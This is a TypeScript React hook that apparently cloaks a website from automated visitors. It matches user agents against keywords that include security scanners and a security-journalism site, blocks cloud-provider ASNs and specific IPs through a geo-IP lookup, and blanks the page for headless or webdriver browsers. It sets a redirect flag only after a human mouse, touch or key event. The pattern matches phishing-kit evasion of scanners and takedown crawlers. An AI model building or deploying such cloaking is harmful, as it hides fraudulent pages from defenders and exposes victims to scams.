import { useEffect, useState } from 'react';

interface BotDetectionResult {
	isBot: boolean;
	isLoading: boolean;
	shouldRedirect: boolean;
}

const blockedKeywords = [
	'bot',
	'crawler',
	'spider',
	'puppeteer',
	'selenium',
	'http',
	'client',
	'curl',
	'wget',
	'python',
	'java',
	'ruby',
	'go',
	'scrapy',
	'lighthouse',
	'censysinspect',
	'facebookexternalhit',
	'krebsonsecurity',
	'ivre-masscan',
	'ahrefs',
	'semrush',
	'sistrix',
	'mailchimp',
	'mailgun',
	'larbin',
	'libwww',
	'spinn3r',
	'zgrab',
	'masscan',
	'yandex',
	'baidu',
	'sogou',
	'tweetmeme',
	'misting',
	'BotPoke',
];

const blockedASNs = [
	15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075,
	214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939,
	209, 51396,
];

const blockedIPs = ['95.214.55.43', '154.213.184.3'];

export const useBotDetection = (): BotDetectionResult => {
	const [isBot, setIsBot] = useState(false);
	const [isLoading, setIsLoading] = useState(true);
	const [shouldRedirect, setShouldRedirect] = useState(false);

	const checkAndBlockBots = (): boolean => {
		const userAgent = navigator.userAgent.toLowerCase();
		if (blockedKeywords.some((keyword) => userAgent.includes(keyword))) {
			document.body.innerHTML = '';
			window.location.href = 'about:blank';
			return true;
		}
		return false;
	};

	const checkAndBlockByGeoIP = async (): Promise<boolean> => {
		try {
			const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
			const data = await response.json();

			if (
				blockedASNs.includes(Number(data.asn)) ||
				blockedIPs.includes(data.ip)
			) {
				document.body.innerHTML = '';
				window.location.href = 'about:blank';
				return true;
			}

			return false;
		} catch {
			return false;
		}
	};

	const checkAdvancedWebDriverDetection = (): boolean => {
		if (navigator.webdriver === true) return true;

		if ('__nightmare' in window) return true;
		if ('_phantom' in window || 'callPhantom' in window) return true;
		if ('Buffer' in window) return true;
		if ('emit' in window) return true;
		if ('spawn' in window) return true;

		const seleniumProps = [
			'__selenium_unwrapped',
			'__webdriver_evaluate',
			'__driver_evaluate',
			'__webdriver_script_function',
			'__webdriver_script_func',
			'__webdriver_script_fn',
			'__fxdriver_evaluate',
			'__driver_unwrapped',
			'__webdriver_unwrapped',
			'__selenium_evaluate',
			'__fxdriver_unwrapped',
		];

		if (seleniumProps.some((prop) => prop in window)) return true;

		if ('__webdriver_evaluate' in document) return true;
		if ('__selenium_evaluate' in document) return true;
		if ('__webdriver_script_function' in document) return true;

		return false;
	};

	const checkNavigatorAnomalies = (): boolean => {
		if (navigator.webdriver === true) return true;

		if (
			navigator.hardwareConcurrency &&
			navigator.hardwareConcurrency > 128
		)
			return true;
		if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1)
			return true;

		return false;
	};

	const checkScreenAnomalies = (): boolean => {
		if (screen.width === 2000 && screen.height === 2000) return true;

		if (screen.width > 4000 || screen.height > 4000) return true;
		if (screen.width < 200 || screen.height < 200) return true;

		if (
			screen.availWidth === screen.width &&
			screen.availHeight === screen.height
		) {
			if (screen.width > 1000 && screen.height > 1000) return true;
		}
		if (screen.width === screen.height && screen.width >= 1500) return true;
		return false;
	};

	useEffect(() => {
		const handleUserInteraction = () => {
			if (!isBot && !isLoading) {
				setShouldRedirect(true);
			}
		};

		const events = [
			'mousemove',
			'mousedown',
			'mouseup',
			'click',
			'touchstart',
			'touchmove',
			'touchend',
			'scroll',
			'keydown',
		];

		events.forEach((event) => {
			document.addEventListener(event, handleUserInteraction, {
				once: true,
				passive: true,
			});
		});

		return () => {
			events.forEach((event) => {
				document.removeEventListener(event, handleUserInteraction);
			});
		};
	}, [isBot, isLoading]);

	useEffect(() => {
		const detectBot = async () => {
			if (checkAndBlockBots()) {
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			if (checkAdvancedWebDriverDetection()) {
				document.body.innerHTML = '';
				window.location.href = 'about:blank';
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			if (checkNavigatorAnomalies()) {
				document.body.innerHTML = '';
				window.location.href = 'about:blank';
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			if (checkScreenAnomalies()) {
				document.body.innerHTML = '';
				window.location.href = 'about:blank';
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			const isBlockedByGeoIP = await checkAndBlockByGeoIP();
			if (isBlockedByGeoIP) {
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			const obviousBotKeywords = [
				'googlebot',
				'bingbot',
				'crawler',
				'spider',
			];
			const isObviousBot = obviousBotKeywords.some((keyword) =>
				navigator.userAgent.toLowerCase().includes(keyword),
			);

			if (isObviousBot) {
				setIsBot(true);
			} else {
				setIsBot(false);
			}
			setIsLoading(false);
		};

		const timer = setTimeout(detectBot, 100);

		return () => clearTimeout(timer);
	}, []);

	return { isBot, isLoading, shouldRedirect };
};
